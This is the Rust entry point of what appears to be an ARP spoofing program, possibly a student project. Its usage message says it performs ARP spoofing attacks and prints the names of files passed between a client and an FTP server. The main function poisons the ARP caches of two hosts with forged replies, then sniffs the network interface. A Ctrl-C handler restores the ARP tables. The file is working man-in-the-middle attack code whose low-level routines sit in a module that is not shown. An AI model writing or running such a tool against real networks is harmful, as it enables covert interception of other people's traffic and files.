mod network;
use network::{arp_reply, arp_spoof, read_network_interface, Config};
use pnet::util::MacAddr;

use std::net::Ipv4Addr;
use ctrlc;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 6 {
        // print usage message with emojis and explanation about the program
        println!("🔒 ARP Spoofing 🔒");
        println!("This program is used to perform ARP Spoofing attacks");
        println!("Prints names of files sent between a client and a FTP server");
        println!("Usage: {} <IP-src> <MAC-src> <IP-target> <MAC-target> <interface>", args[0]);
        std::process::exit(1);
    }
    // convert arguments to Ipv4Addr and MacAddr
    // and handle errors with error messages with emojis
    let ip_src = args[1].parse::<Ipv4Addr>().unwrap_or_else(|_| {
        println!("Invalid source IP address");
        std::process::exit(1);
    });
    let mac_src = args[2].parse::<MacAddr>().unwrap_or_else(|_| {
        println!("Invalid source MAC address");
        std::process::exit(1);
    });
    let ip_target = args[3].parse::<Ipv4Addr>().unwrap_or_else(|_| {
        println!("Invalid target IP address");
        std::process::exit(1);
    });
    let mac_target = args[4].parse::<MacAddr>().unwrap_or_else(|_| {
        println!("Invalid target MAC address");
        std::process::exit(1);
    });
    let interface_name = args[5].clone();
    ctrlc::set_handler(move || {
        // reset arp tables
        arp_reply(ip_src, mac_src, ip_target, mac_target, &interface_name);
        arp_reply(ip_target, mac_target, ip_src, mac_src, &interface_name);
        println!("ARP tables reset");
        std::process::exit(0);
    }).expect("Error setting Ctrl-C handler");

    let interface_name = args[5].clone();
    // fill the configuration structure
    let config = Config {
        ip_src,
        mac_src,
        ip_target,
        mac_target,
        interface_name: interface_name.clone(),
    };
    for _ in 0..3 {
        arp_spoof(ip_target, mac_target, ip_src, &interface_name);
        arp_spoof(ip_src, mac_src, ip_target, &interface_name);
    }

    read_network_interface(&config);
}

